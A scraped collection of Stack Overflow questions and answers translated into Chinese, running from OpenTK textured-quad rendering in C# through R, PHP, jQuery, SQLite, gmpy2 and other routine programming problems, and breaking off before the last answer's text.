            // Bind vertex array buffer
            GL.GenBuffers(1, out _vertexBufferId);
            GL.BindBuffer(BufferTarget.ArrayBuffer, _vertexBufferId);
            GL.BufferData(BufferTarget.ArrayBuffer, (IntPtr) (_vertices.Length*Vector2.SizeInBytes), _vertices,
                          BufferUsageHint.StreamDraw);
            GL.BindBuffer(BufferTarget.ArrayBuffer, 0);

            // Bind index array buffer
            GL.GenBuffers(1, out _indexBufferId);
            GL.BindBuffer(BufferTarget.ElementArrayBuffer, _indexBufferId);
            GL.BufferData(BufferTarget.ElementArrayBuffer, (IntPtr) (_indices.Length*sizeof (Byte)), _indices,
                          BufferUsageHint.StaticDraw);
            GL.BindBuffer(BufferTarget.ElementArrayBuffer, 0);
        }

        public void DrawQuad(Int32 x, Int32 y, Int32 width, Int32 height)
        {
            UpdateQuadVertices(x, y, width, height);

            GL.Disable(EnableCap.Texture2D);
            GL.BindTexture(TextureTarget.Texture2D, 0);

            GL.EnableClientState(ArrayCap.VertexArray);
            GL.EnableClientState(ArrayCap.ColorArray);
            GL.EnableClientState(ArrayCap.NormalArray);
            GL.EnableClientState(ArrayCap.TextureCoordArray);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _vertexBufferId);
            GL.VertexPointer(2, VertexPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _colorBufferId);
            GL.ColorPointer(4, ColorPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _normalBufferId);
            GL.NormalPointer(NormalPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _textureBufferId);
            GL.TexCoordPointer(2, TexCoordPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ElementArrayBuffer, _indexBufferId);

            GL.DrawElements(BeginMode.Triangles, _indices.Length, DrawElementsType.UnsignedByte, 0);
        }

        public void DrawQuadTex(Int32 x, Int32 y, Int32 width, Int32 height, Int32 textureId)
        {
            UpdateQuadVertices(x, y, width, height);

            GL.Enable(EnableCap.Texture2D);
            GL.BindTexture(TextureTarget.Texture2D, textureId);

            GL.EnableClientState(ArrayCap.VertexArray);
            GL.EnableClientState(ArrayCap.ColorArray);
            GL.EnableClientState(ArrayCap.NormalArray);
            GL.EnableClientState(ArrayCap.TextureCoordArray);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _vertexBufferId);
            GL.VertexPointer(2, VertexPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _colorBufferId);
            GL.ColorPointer(4, ColorPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _normalBufferId);
            GL.NormalPointer(NormalPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ArrayBuffer, _textureBufferId);
            GL.TexCoordPointer(2, TexCoordPointerType.Float, 0, IntPtr.Zero);

            GL.BindBuffer(BufferTarget.ElementArrayBuffer, _indexBufferId);

            GL.DrawElements(BeginMode.Triangles, _indices.Length, DrawElementsType.UnsignedByte, 0);

            // Removing this has no effect
            GL.DisableClientState(ArrayCap.TextureCoordArray);
        }

        internal void UpdateQuadVertices(Int32 x, Int32 y, Int32 width, Int32 height)
        {
            _vertices[0].X = x;
            _vertices[0].Y = y;
            _vertices[1].X = x + width;
            _vertices[1].Y = y;
            _vertices[2].X = x;
            _vertices[2].Y = y + height;
            _vertices[3].X = x + width;
            _vertices[3].Y = y + height;

            GL.BindBuffer(BufferTarget.ArrayBuffer, _vertexBufferId);
            GL.BufferSubData(BufferTarget.ArrayBuffer, IntPtr.Zero, (IntPtr) (_vertices.Length*Vector2.SizeInBytes),
                             _vertices);
            GL.BindBuffer(BufferTarget.ArrayBuffer, 0);
        }

        public Int32 LoadSimpleTexture()
        {
            Int32 textureObjectId;

            GL.GenTextures(1, out textureObjectId);
            GL.BindTexture(TextureTarget.Texture2D, textureObjectId);
            GL.TexParameter(TextureTarget.Texture2D, TextureParameterName.TextureMinFilter,
                            (Int32) TextureMinFilter.Linear);
            GL.TexParameter(TextureTarget.Texture2D, TextureParameterName.TextureMagFilter,
                            (Int32)TextureMagFilter.Linear);

            var bitmap = new Bitmap("simple.png");
            BitmapData data = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height),
                                              ImageLockMode.ReadOnly,
                                              System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            GL.TexImage2D(TextureTarget.Texture2D, 0, PixelInternalFormat.Rgba, data.Width, data.Height, 0,
                          OpenTK.Graphics.OpenGL.PixelFormat.Bgra, PixelType.UnsignedByte, data.Scan0);

            bitmap.UnlockBits(data);

            return textureObjectId;
        }
    }

    class Program
    {
        static void Main()
        {
            Int32 textureObjectId = 0;

            using (var gameWindow = new GameWindow(800, 600))
            {
                var renderer = new Renderer();
                gameWindow.Load += (s, e) =>
                                       {
                                           GL.ClearColor(Color.CornflowerBlue);
                                           GL.Enable(EnableCap.Blend);
                                           GL.BlendFunc(BlendingFactorSrc.SrcAlpha, BlendingFactorDest.OneMinusSrcAlpha);
                                           GL.AlphaFunc(AlphaFunction.Greater, 1.0f);

                                           textureObjectId = renderer.LoadSimpleTexture();

                                       };
                gameWindow.Resize += (s, e) =>
                                         {
                                             GL.Viewport(0, 0, 800, 600);
                                             GL.MatrixMode(MatrixMode.Projection);
                                             GL.LoadIdentity();
                                             GL.Ortho(0, 800, 600, 0, -1, 1);
                                         };
                gameWindow.RenderFrame += (s, e) =>
                                              {
                                                  GL.Clear(ClearBufferMask.ColorBufferBit | ClearBufferMask.DepthBufferBit);
                                                  renderer.DrawQuad(0, 0, 128, 128);
                                                  renderer.DrawQuadTex(128, 0, 128, 128, textureObjectId);

                                                  gameWindow.SwapBuffers();
                                              };

                gameWindow.Run();
            }

        }
    }
} 
```

## 更新

当我说首先调用的函数是显示形状的函数是不准确的时，实际上只有未纹理取代纹理（即，当存在 DrawQuad 时，只有未纹理可见）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-29T10:32:15.453

您发布的示例代码工作得很好。因此，我无法重现您描述的问题。从图片中可以明显看出，纹理和非纹理四边形都存在。然而，带纹理的四边形还与导致彩虹外观的颜色混合。要解决此问题，请禁用颜色指针或用白色填充颜色缓冲区。

如果您机器上的结果与我在下面发布的图片不匹配，则可能表明其他力量在起作用。一个可能的相关示例可能是视频卡（-驱动程序）的选择。

![彩色和纹理四边形](../Images/0ee41aa7f2130bde161f2a4b83e0a939.png) ![彩色和纹理四边形](../Images/96c533e8745a6a1a5ac17bdf4f8126b3.png)

# r - 如何在 R 中向 PCA 图中添加多个置信椭圆？

> ID：12078264
> 
> 赞同：3
> 
> 时间：2012-08-22T17:18:43.317
> 
> 标签：r, pca

一般来说，我对 R 和统计数据非常陌生，并且在向 PCA 图添加多个置信椭圆时遇到了麻烦。

我的兴趣是用 95% 的置信椭圆突出 PCA 图中的潜在分组/集群。我尝试在 R 中使用 dataEllipse 函数，但是我无法弄清楚如何将具有不同中心的多个椭圆添加到 PCA 图（中心将位于似乎包含集群的各个点，在这种情况下是石源和石工具可能来自该来源）。

感谢您对此的任何帮助！{

```
lithic_final <- LITHIC.DATASHEET.FOR.R.COMPLETE.FORMAT
lithic_final

pca1 <- princomp(lithic_final); pca1

lithic_source <- c("A1", "A1", "A1", "A1", "A2","A2", "A2", "A3","A3","A3","B","B","B","B","B","B","C","C","C","C","C","C","C","D","D","D","D","D","D","D","D","E","E","E","E","E","E","E","E","F","F","G","G","G","G","H","H","H","H","H","H","H","I1","I1","I1","I2","I2","I2","I2","I2","J1","J1","J2","J2","J2","J2","J2","J2","J2","J2","J2","K","K","K","K","K","K","K","L","L","L","L","L","L","L","L","L","L","L","L","L","L","BB1","BB1","BB1","FC","FC","FC","JRPP","JRPP","JRPP","BB2","BB2","BB2","BB2","MWP","MWP","MWP","MWP","RPO","RPO","RPO")

lithic_source

summary(pca1)

plot(pca1)

#Plotting the scores with the Lithic Source Info
round(pca1$scores[,1:2], 2)
pca_scores <-round(pca1$scores[,1:2], 2)
plot(pca1$scores[,1], pca1$scores[,2], type="n")
text(pca1$scores[,1], pca1$scores[,2],labels=abbreviate(lithic_source, minlength=3), cex=.45)

#Plotting PCA Scores of EACH SAMPLE for PCA 2 and 3 with Lithic Source Info
round(pca1$scores[,2:3], 2)
pca2_3_scores <-round(pca1$scores[,2:3], 2)
plot(pca1$scores[,2], pca1$scores[,3], type="n")
text(pca1$scores[,2], pca1$scores[,3], labels=abbreviate(lithic_source, minlength=3), cex=.45)

#Plotting PCA Scores of EACH SAMPLE for PCA 3 and 4 with Lithic Source Info
round(pca1$scores[,3:4], 2)
pca3_4_scores <-round(pca1$scores[,3:4], 2)
plot(pca1$scores[,3], pca1$scores[,4], type="n")
text(pca1$scores[,3], pca1$scores[,4], labels=abbreviate(lithic_source, minlength=3), cex=.45)

#Plotting PCA Scores of EACH SAMPLE for PCA 1 and 3 with Lithic Source Info
round(pca1$scores[,1:3], 2)
pca1_3_scores <-round(pca1$scores[,1:3], 2)
plot(pca1$scores[,1], pca1$scores[,3], type="n")
text(pca1$scores[,1], pca1$scores[,3], labels=abbreviate(lithic_source, minlength=3), cex=.45)

#Plotting PCA Scores of EACH SAMPLE for PCA 1 and 4 with Lithic Source Info
round(pca1$scores[,1:4], 2)
pca1_4_scores <-round(pca1$scores[,1:4], 2)
plot(pca1$scores[,1], pca1$scores[,4], type="n")
text(pca1$scores[,1], pca1$scores[,4], labels=abbreviate(lithic_source, minlength=3), cex=.45)

#TRYING TO GET ELLIPSES ADDED TO PCA 1 and 4 scores
dataEllipse(pca1$scores[,1], pca1$scores[,4],centers=12,add=TRUE,levels=0.9, plot.points=FALSE)

structure(list(Ca.K12 = c(418L, 392L, 341L, 251L, 297L, 238L, 
258L, 5L, 2L, 37L), Cr.K12 = c(1L, 12L, 15L, 6L, 9L, 6L, 35L, 
7L, 45L, 32L), Cu.K12 = c(89L, 96L, 81L, 63L, 88L, 103L, 104L, 
118L, 121L, 90L), Fe.K12 = c(18627L, 18849L, 18413L, 12893L, 
17757L, 17270L, 16198L, 2750L, 4026L, 3373L), K.K12 = c(20L, 
23L, 28L, 0L, 34L, 17L, 45L, 102L, 150L, 147L), Mn.K12 = c(205L, 
212L, 235L, 120L, 216L, 212L, 246L, 121L, 155L, 115L), Nb.K12 = c(139L, 
119L, 154L, 91L, 122L, 137L, 137L, 428L, 414L, 428L), Rb.K12 = c(99L, 
42L, 79L, 49L, 210L, 243L, 168L, 689L, 767L, 705L), Sr.K12 = c(3509L, 
3766L, 3481L, 2715L, 2851L, 2668L, 2695L, 202L, 220L, 217L), 
    Ti.K12 = c(444L, 520L, 431L, 293L, 542L, 622L, 531L, 82L, 
    129L, 84L), Y.K12 = c(135L, 121L, 105L, 74L, 144L, 79L, 85L, 
    301L, 326L, 379L), Zn.K12 = c(131L, 133L, 108L, 78L, 124L, 
    111L, 114L, 81L, 78L, 59L), Zr.K12 = c(1348L, 1479L, 1333L, 
    964L, 1506L, 1257L, 1296L, 3967L, 4697L, 4427L)), .Names = c("Ca.K12", 
"Cr.K12", "Cu.K12", "Fe.K12", "K.K12", "Mn.K12", "Nb.K12", "Rb.K12", 
"Sr.K12", "Ti.K12", "Y.K12", "Zn.K12", "Zr.K12"), row.names = c(NA, 
10L), class = "data.frame") 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-23T16:50:47.220

如果您专注于您的问题而不是所有无关紧要的东西，我认为您会收到更快的回复。您向我们提供了绘制一堆与您的问题无关的主成分的命令。问题是，如何按组绘制椭圆？您的 10 行和 3 组样本数据没有帮助，因为 3 个点不足以绘制数据椭圆。您正在使用包 car 中的 dataEllipse 函数，它对您的问题有最简单的答案：

首先，一个可重现的例子：

```
set.seed(42) # so you can get the same numbers I get
source_a <- data.frame(X1=rnorm(25, 50, 5), X2=rnorm(25, 40, 5))
source_b <- data.frame(X1=rnorm(25, 20, 5), X2=rnorm(25, 40, 5))
source_c <- data.frame(X1=rnorm(25, 35, 5), X2=rnorm(25, 25, 5))
lithic_dat <- rbind(source_a, source_b, source_c)
lithic_source <- c(rep("a", 25), rep("b", 25), rep("c", 25)) 
```

用 scatterplot() 绘制椭圆并添加文本：

```
scatterplot(X2~X1 | lithic_source, data=lithic_dat, pch="", smooth=FALSE, 
     reg.line=FALSE, ellipse=TRUE, levels=.9)
text(lithic_dat$X1, lithic_dat$X2, lithic_source, cex=.75) 
```

可以调整散点图来做任何你想做的事情，但也可以在不使用它的情况下绘制椭圆：

```
sources <- unique(lithic_source) # vector of the different sources
plot(lithic_dat$X1, lithic_dat$X1, type="n")
text(lithic_dat$X1, lithic_dat$X2, lithic_source, cex=.75)
for (i in sources) with(lithic_dat, dataEllipse(X1[lithic_source==i],
     X2[lithic_source==i], levels=.9, plot.points=FALSE)) 
```

这将适用于您的主要组件和任何其他数据。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-24T03:37:32.923

这是一个简单的解决方案，它使用名为 ggbiplot 的包（可在 github 上获得）和 Iris 数据。我希望这就是你要找的。

```
library(devtools);install_github('vqv/ggbiplot')
library(ggbiplot)
pca = prcomp(iris[,1:4]) 
ggbiplot(pca,groups = iris$Species,ellipse = T,ellipse.prob = .95) 
```

# php - 在子文件夹搜索中选择特定图像名称

> ID：12078266
> 
> 赞同：0
> 
> 时间：2012-08-22T17:18:55.173
> 
> 标签：php, image, if-statement, directory

我正在使用以下代码搜索目录的所有子文件夹中的所有图像：

```
 function get_images10($root) {

            $r = array();
            foreach(glob("$root/*") as $n) {
                if (is_dir($n)) {
                    $r = array_merge($r, get_images10($n));
                } else {
                   $r[] = $n;
                }
            }

            return $r;
        } 
```

它工作正常，但现在我想将搜索仅限于文件名中包含后缀“thumb-”的图像。在另一个脚本中，我使用了以下内容：

```
if ((strpos($filename,'thumb-') !== false)) {
  //some code
} 
```

但是我不知道在上面提到的代码中将这样的语句（if）放在哪里。知道我该怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:25:29.637

如果 'thumb-' 是文件名中的前缀，您只需将第 3 行更改为：

```
foreach(glob("$root/thumb-*") as $n) { 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:25:47.777

我假设它是一个前缀，因为它以`-`. 无论如何，你会在`else`as中做到这一点`elseif`：

```
function get_images10($root) {
    $r = array();

    foreach(glob("$root/*") as $n) {
        if (is_dir($n)) {
            $r = array_merge($r, get_images10($n));
        } elseif (strpos($n, 'thumb-') !== false) {
            $r[] = $n;
        }
    }

    return $r;
} 
```

# google-app-engine - 在 Google App Engine 中，如何为付费用户提供比免费用户响应速度更快的应用程序？

> ID：12078267
> 
> 赞同：2
> 
> 时间：2012-08-22T17:19:20.983
> 
> 标签：google-app-engine

任何人都知道如何使用 Google App Engine 实现差异化服务？我有两种类型的用户。一个是高级用户，另一个是免费用户。我想在两者之间设置不同的最小延迟来启动新的 GAE 实例。换句话说，我愿意为高级用户产生的流量支付额外费用。尽管如此，对于免费用户，我更愿意至少或在谷歌提供的每日免费配额内付费。就我而言，我希望免费用户能够容忍比高级用户更高的延迟。我相信这个案例应该是比较笼统的，适用于很多人。

假设我可以通过用户使用的 URL 或其他机制来识别用户类型。我能想到的唯一方法是创建两个独立的应用程序，让高级用户访问启用计费的应用程序，而免费用户访问不启用计费的应用程序。但是，我的免费和高级用户需要共享数据存储，因为他们还必须在应用程序内进行通信。不幸的是，目前似乎不可能在不影响性能的情况下跨应用程序共享数据存储。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T07:23:52.870

No, this is not possible right now. App Engine gives you a few knobs to balance cost vs. response time: instance class (applies to all versions), min/max pending latency, and min/max idle instances. The latter two sets of knobs only apply to the default version of your app.

There are other ways you can try to lower cost for free users though. e.g. give them limited storage, limit the number of logins or page views over a period of time, serve them lower quality images (if your app is image intensive), etc.

I'm not sure "cut costs for free users" is a useful strategy though. The conventional wisdom is that you want to turn your free users into paying customers (known as "conversion" in the biz). This is more or less what App Engine itself tries to do :P. There is no magic bullet that instantly turns free users into paying customers. The "trick" (if you can call it that) is to make the paid version of your app so compelling that people would rather part with their money in order to have it.

# jquery - jQuery click 在弹出窗口中不起作用

> ID：12078270
> 
> 赞同：0
> 
> 时间：2012-08-22T17:19:29.533
> 
> 标签：jquery, popup, jquery-ui-dialog

我有两个编码完全相同的文件，文件 A 和 B。在文件 A 中，有一些链接可以创建文件 B 的弹出窗口。在文件 A 的顶部，我创建了一个链接（a href），单击该链接时，提醒用户。这个确切的代码在文件 B 中。它在文件 A 中有效，但在文件 B 中无效。

```
 <a href="#" id="send-email">Send Email</a> 
```

和 jQuery：

```
 $('#send-email').click(function(e) {
        alert('works');
    }); 
```

奇怪的是，它们都链接到同一个外部 jQuery 文件，并且那里的所有其他 jQuery 函数都可以工作（例如，手风琴菜单），除了这个弹出点击。我首先尝试使用 jQueryUI，但这就是我发现这个问题的方式；然后我只使用准系统点击警报，这就是我在上面发布的代码。

.click 在弹出窗口中有效吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:30:31.993

弹出窗口实际上与任何其他页面没有什么不同（除非您在某些浏览器中谈论会话状态和上下文，但这不是这里的问题）。`click`在弹出窗口中的功能与在任何其他窗口中的功能相同。但是，有很多事情可能会导致您的问题。重复的 ID、缺少/拼写错误的功能等。

所以我还不能给你一个明确的答案，但这是调试它的一个很好的步骤：

而不是像你这样做的方式附加一个点击事件（注意你的方式比我的方式正确得多，但我的方式有助于调试），这样做：

```
<a href="#" onclick = "alert('works')" id="send-email">Send Email</a> 
```

如果这不起作用，也许你正在阻止弹出窗口或其他东西。这是警报的问题。如果它确实有效，请尝试以下操作：

```
<a href="#" onclick = "AlertIt()" id="send-email">Send Email</a> 
```

在您的页面上的其他地方：

```
function AlertIt() {
alert("worked");
} 
```

如果这也有效，那么您很可能会看到加载 jQuery 的问题或 jQuery 冲突。

编辑：哦，还有一件事。尝试使用 jQuery 的`live`函数。这会将事件处理程序附加到元素，无论它们是否已经存在。`click`如果元素已经存在，只会附加事件。这可能是由您正在使用的操作顺序引起的。

`live`看起来像这样：

```
$("#send-email").live("click", function(){ alert("Worked"); }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:43:41.690

同意@voigtan。为动态内容分配事件处理程序可能很棘手。

如果您在文档就绪处理程序中绑定事件，则事件处理程序可能未绑定到弹出窗口中的内容。有两种方法可以解决这个问题：

1.  弹出内容显示后有回调，为新元素绑定事件
2.  如果元素具有统一的事件处理程序，则为它们分配一个可用作选择器的类，并使用 jQuery::live() 调用附加事件。这是一个例子：

    ```
    <a href="#" class="send-email">Send Email</a>

    $(function() {
        $(document).on("click", "a.send-email", function(e) {
            alert('works');
            e.preventDefault();
        });
    }); 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:23:52.587

弹出窗口是什么意思？你的意思是jQueryUI对话框吗？如果是这样，当您加载 javascript 代码时标记是否存在？

`.on`如果您使用的是 jQuery 1.7+，则可以使用，并且只需`#send-email`在页面加载时对页面上的所有内容执行委托，或者使用 AJAX 以动态方式加载它：

```
$(function() {
    $(document).on("click", "#send-email", function(e) {
        alert('works');
        e.preventDefault();
    });
}); 
```

# ruby - Ruby：将时间字符串转换为符合 xsd:datetime 的字符串？

> ID：12078275
> 
> 赞同：1
> 
> 时间：2012-08-22T17:20:03.397
> 
> 标签：ruby, xml, xsd

我有这个：“2013-02-23 18:06:00 UTC”

并且需要这个：“2013-02-23T18:06:00Z”

符合这一点：http: [//books.xmlschemata.org/relaxng/ch19-77049.html](http://books.xmlschemata.org/relaxng/ch19-77049.html)

有谁知道 Ruby 中有一个好的库/工具/方法可以做到这一点而无需编写一些转换方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:50:34.390

`Datetime` [在这里](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/date/rdoc/DateTime.html)查看 ruby​​docs 。有一种方法可以转换为 ISO8601。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:56:59.127

在 Rails 中：

```
DateTime.now.utc.strftime()
=> "2012-08-22T17:55:12+00:00" 
```

# python - 这是 gmpy2 中的错误还是我疯了？

> ID：12078277
> 
> 赞同：1
> 
> 时间：2012-08-22T17:20:07.263
> 
> 标签：python, math, gmp

我正在尝试在 gmpy2 中使用 gcdext 函数，但无论我把什么作为参数，我总是得到结果 (0,0,1)。我希望这是一个错误，但只是为了检查，这是否会导致 (0,0,1) ？

```
from gmpy2 import *
print(gcdext(13, 21)) #Should be (1,-8,5)? 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T17:46:08.850

这是从 Python long 转换为内部 mpz 类型的错误。作为一种快速解决方法，首先将参数转换为 mpz。

顺便说一句，我是 gmpy2 的维护者。[您可以在http://code.google.com/p/gmpy/](http://code.google.com/p/gmpy/)上打开一个问题吗？

更新：此错误已在 gmpy2 2.0.0b2 中修复。

# r - 存储 fitdist 的结果

> ID：12078278
> 
> 赞同：-2
> 
> 时间：2012-08-22T17:20:10.167
> 
> 标签：r

我正在对我的数据进行分布拟合分析。我正在尝试 5 种不同的分布，我想将每个分布的结果存储在数组或矩阵中。所以我正在使用 fitdistrplus 包的 fitdist 功能，一切顺利，但我不知道如何保存每个结果。这是一个新手问题，但我已经用谷歌搜索了几次，但没有找到有用的结果。

当前代码：

```
for loop
    .....
    params = fitdist( data, dist,method="mle")
    print( params )
    summary( params ) 
    plot( params ) 
```

所以我需要类似的东西：

```
for loop
    .....
    params = fitdist( data, dist,method="mle")
    result1[i]<-print( params ) #Can I save a print (graphics)?
    result2[i]<-summary( params ) 
    result3[i]<-plot( params ) 
```

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:09:32.007

（您*应该*提供一个示例来说明您如何表示“数据”和“分布”。）

您需要预定义结果项，因为`resutl1[i]<-`如果循环`result1`中不存在，R 将不会自动接受。这假设 'data' 和 'distr' 是适当类型的列表或向量`fitdistr`。您可能需要在`fitdistr`.

```
result1<-result2<-result3<-list()
for (i in seq_along(data) ) 
   {
    params = fitdist( data[i], dist[i], method="mle")
    result1[i]<-print( params )
     #Can I save a print (graphics)?
     # You can save lattice and ggplot2 graphics as list objects but I think `fitdistr`
     # may use base graphics which cannot be saved unless you use a file graphics device
    result2[i]<-summary( params ) 
    result3[i]<-plot( params )
   } 
```

您将使用`results[[i]]`而不是`results[i]`因为 "[[" 提取列表中的实际值来访问结果对象，而`results[i]`会给您一个包含一个元素的子列表。如果只保存“params”对象可能会更好（更紧凑，最终更灵活），您以后可以`summary()`根据`print()`需要应用这些对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:08:50.227

刚`result1[i]<-matrix()`开始使用！

# facebook - 内置 Like 不会触发 Facebook 通知

> ID：12078281
> 
> 赞同：0
> 
> 时间：2012-08-22T17:20:18.567
> 
> 标签：facebook, api, facebook-like, facebook-opengraph

[按照facebook 教程](http://developers.facebook.com/docs/opengraph/actions/builtin/likes/)，我们已经在我们的应用程序中实现了内置的开放图形操作“点赞” 。

在我们的应用程序中：

1.  用户可以**“提供”**（动作）**“资产”**（对象）。
2.  然后朋友可以**“喜欢”**（动作）那个**“资产”**（对象）。

现在，当这种情况发生时，Facebook 通知应该会出现在用户的 Facebook 上。

> 当朋友在社交食谱应用程序的上下文中查看用户的“食谱”并单击相关的“喜欢按钮”时，该按钮也会将内置的“喜欢”动作发布到 Open Graph，将生成 Facebook 通知。

像这个：

![脸书通知](../Images/8b514c75c84643256c62a0e53585d290.png)

正如 facebook 所解释的，我们在“资产”对象页面上添加了动作“offer”作为**“creation action” ：**

![创作动作](../Images/10ec1ba3195f76f7efe6ff9e4f2ac3dd.png)

> 要在发布内置点赞操作时启用 Facebook 通知，请为表示用户生成内容的对象配置“创建操作”

但仍然没有任何反应。我们做错了什么？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T00:51:43.100

我刚刚找到了这个问题的原因：

“只有当‘喜欢’对象的人是用户的 Facebook 朋友，这个朋友的应用活动对用户可见，并且 Open Graph 对象是由用户通过“创建”时，这个 Facebook 通知才会向用户显示。创造行动”。

请确保喜欢您的对象的人满足前两个条件，然后才会出现宝石通知。

# sql - 同一查询的 SQLite 命令行客户端和 SQLite 库之间的性能不同

> ID：12078282
> 
> 赞同：2
> 
> 时间：2012-08-22T17:20:19.247
> 
> 标签：sql, sqlite

我一直在开发一个性能关键型应用程序，其中一个涉及的查询具有这种结构（名称已更改，但没有其他内容）：

```
SELECT x.* FROM a
LEFT OUTER JOIN (
    SELECT c_a, c_b, c_c
    FROM b
    UNION ALL
    SELECT c_a, c_b, c_c
    FROM c
) AS x
ON a.c_a = x.c_a
WHERE a.c_d = ?
ORDER BY a.c_a 
```

我已经运行`EXPLAIN QUERY PLAN`了这个查询，所有索引似乎都被适当地使用了。使用命令行客户端，此查询在大约 0.75 秒内完成。考虑到数据库中的数据量，这是我所期望的。

但是，通过 SQLite 库执行的相同查询给出了截然不同的行为。Profiler 数据显示，对于该查询的*一次*执行，该`sqlite3_step()`函数花费的时间约为 120 秒。这个亚秒级的查询在库中需要两分钟，我完全没有解释为什么。

在这两种情况下操作的数据库文件是逐字节相同的。

SQLite 库是 3.7.2 版本，命令行客户端是 3.7.13 版本。我不知道这是否是一个因素，但对我来说似乎不太可能。

* * *

我尝试过的事情：

*   清空数据库。性能没有统计学上显着的改善。
*   改变日记模式。由于与这个问题无关的原因，我从使用回滚日志切换到 WAL，但这也确实对性能产生了任何统计上的显着影响。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:51:48.163

为了给观察者和参与者提供封闭性，升级到 SQLite 3.7.13 似乎已经解决了这个问题；现在花费了 1.5 秒，`sqlite3_step()`这显然是一个巨大的进步。3.7.2 似乎有一些错误或缺少优化，从而夸大了执行查询所需的时间。

其他奇怪行为的实例还包括 60 秒的倍数的延迟。这可能表明 3.7.2 中与锁相关的错误（参见[EthanB 的回答](https://stackoverflow.com/a/12078605/501250)）已经解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:44:00.830

当 SQLite 库尝试运行时，命令行客户端是否锁定了数据库？我似乎记得 60 秒是 SQLite 查询超时（我使用 NHibernate 客户端遇到的）。

# c++ - 如何在没有库的情况下在 C++ 中初始化套接字

> ID：12078283
> 
> 赞同：0
> 
> 时间：2012-08-22T17:20:25.577
> 
> 标签：c++, sockets

我需要在没有库的情况下用 C++（GNU GCC）初始化套接字。当我用谷歌搜索它时，它建议使用 WinSock Library 或类似的东西。这该怎么做？谢谢你的回答。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-22T17:25:58.040

你不能。标准定义的 C++ 语言没有套接字规范。要使用它们，您必须使用一些特定于实现的库，例如 WinSock。

我建议您使用 Boost 的 ASIO 库，它为您完成了所有艰苦而肮脏的工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:26:43.517

套接字由操作系统分配，因此您需要以某种方式与操作系统交互。根据我使用 GCC 的 C++ 经验（我假设这里是某种 Linux），您将需要使用 sys/sockets 库。套接字库的一些更高级别的抽象存在，但我从来没有找到一个我太满意的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-23T03:06:59.660

C++ 标准没有提供这一点。一个很好的 crossx 库是[C++ PTypes](http://www.melikyan.com/ptypes/)。

# c# - 如何在 SQLite、C# 和 Windows 8 中创建链接表？

> ID：12078284
> 
> 赞同：2
> 
> 时间：2012-08-22T17:20:28.107
> 
> 标签：c#, sqlite, windows-8, windows-runtime

对于我的 Windows Phone 应用程序，我将 SQL CE 与 LINQ 结合使用，并使用 EntityRef 和 EntitySet 将多个表绑定在一起。

这些在 Windows 应用商店应用程序的 .NET 框架中不可用，所以我有点难过。

与我在开发手机应用程序时使用的相比，WinRT 对 SQLite 的支持看起来有点基础。我可以从 Tim Heuer 的博客 (http://timheuer.com/blog/archive/2012/08/07/updated-how-to-using-sqlite-from-windows-store-apps.aspx) 中看到 SQLite- net 库允许我执行 CreateTable() 之类的操作，但没有太多文档。

我是否基本上必须编写代码，以便如果我想找到链接到 Y 的项目 X，那么我必须 (a) 在所有类中保留 ID 号，并且 (b) 搜索 ID 号以找到比赛？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T19:53:47.197

[System.Data.SQLite](http://system.data.sqlite.org/index.html/doc/trunk/www/index.wiki)是 SQLite 的 ADO.NET 适配器，它支持 LINQ。我怀疑您应该能够以与使用 SQL CE 相同的方式使用它，只需最少或没有代码更改。

# python - python装饰器中的变量范围-更改参数

> ID：12078288
> 
> 赞同：5
> 
> 时间：2012-08-22T17:21:10.640
> 
> 标签：python, decorator

我有以下带参数的装饰器：

```
from functools import wraps
def pdecor(p):
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            p -= 1
            return fn(*args, **wargs)
        return wrapper
    return decorator 
```

尝试使用装饰器会导致：

```
>>> @pdecor(1)
... def run(): pass
...
>>> run()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 5, in wrapper
UnboundLocalError: local variable 'p' referenced before assignment
>>> 
```

为什么我不能更改`p`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-22T17:27:12.393

